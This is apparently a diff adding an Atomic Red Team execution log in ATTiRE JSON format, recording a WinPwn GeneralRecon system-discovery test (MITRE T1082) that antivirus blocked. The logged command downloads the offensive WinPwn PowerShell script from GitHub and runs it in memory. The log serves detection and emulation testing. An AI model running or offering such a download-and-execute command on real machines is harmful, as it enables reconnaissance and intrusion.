@@ -1,0 +1,48 @@
+{
+    "attire-version":  "1.1",
+    "execution-data":  {
+                           "execution-source":  "Invoke-Atomicredteam",
+                           "execution-id":  "MTkzMTllNzMtMjAyOS00ZmY2LTg4YjQtZjFjMTEyMTIxZTA0",
+                           "execution-category":  {
+                                                      "name":  "Atomic Red Team",
+                                                      "abbreviation":  "ART"
+                                                  },
+                           "execution-command":  "Invoke-AtomicTest T1082 -TestGuids 7804659b-fdbf-4cf6-b06a-c03e758590e8 -PathToAtomicsFolder C:\\AtomicRedTeam\\atomics -ExecutionLogPath C:\\AtomicRedTeam\\invoke-atomicredteam\\Logs\\T1082-7804659b-fdbf-4cf6-b06a-c03e758590e8.json -TimeoutSeconds 120 -LoggingModule Attire-ExecutionLogger",
+                           "target":  {
+                                          "user":  "redshirt\\edrba",
+                                          "host":  "RedShirt",
+                                          "ip":  "192.168.56.1",
+                                          "path":  "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps"
+                                      },
+                           "time-generated":  "2024-10-12T18:07:07.000Z"
+                       },
+    "procedures":  [
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - GeneralRecon",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "7804659b-fdbf-4cf6-b06a-c03e758590e8"
+                                            },
+                           "procedure-description":  "Collect general computer informations via GeneralRecon function of WinPwn",
+                           "order":  18,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:03.000Z",
+                                             "time-stop":  "2024-10-12T18:07:07.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nGeneralrecon -consoleoutput -noninteractive",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nGeneralrecon : The term Generalrecon is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ Generalrecon -consoleoutput -noninteractive}\r\n+ ~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Generalrecon:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       }
+                   ]
+}
+
